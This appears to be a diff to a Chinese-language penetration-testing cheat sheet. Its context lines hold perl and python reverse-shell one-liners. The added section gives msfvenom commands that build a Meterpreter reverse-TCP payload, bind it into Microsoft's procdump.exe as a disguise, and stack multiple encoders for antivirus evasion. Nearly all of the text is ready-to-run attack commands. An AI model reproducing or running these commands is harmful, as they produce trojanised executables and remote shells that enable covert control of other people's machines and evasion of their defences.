@@ -200,3 +200,20 @@ perl: perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,get
 python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ```
+
+**编码捆绑免杀部分**
+测试编码并绑定微软官方工具，这里使用官方procdump做实验
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.91.129 LPORT=7777 -e x86/shikata_ga_nai -x procdump.exe  -i 20 -f exe -o t3.exe
+```
+
+
+**0x05多重编码**
+
+通过资料了解，msfvenom某一种编码器可以做到一定程度的免杀，这是可以多重编码增大免杀率，同时x86/shikata_ga_nai为多态编码，可以尝试增大编码次数达到免杀效果
+```
+msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 100 LHOST=192.168.56.129 LPORT=7777 -f raw | msfvenom -a x86 –platform windows -e x86/countdown -i 100 -f raw | msfvenom -a x86 –platform windows -e x86/shikata_ga_nai -b “&” -i 100 -f raw | msfvenom -a x86 –platform windows -e cmd/powershell_base64 -i 100 -x procdump.exe -k -f exe >t4.exe
+```
+
+
+
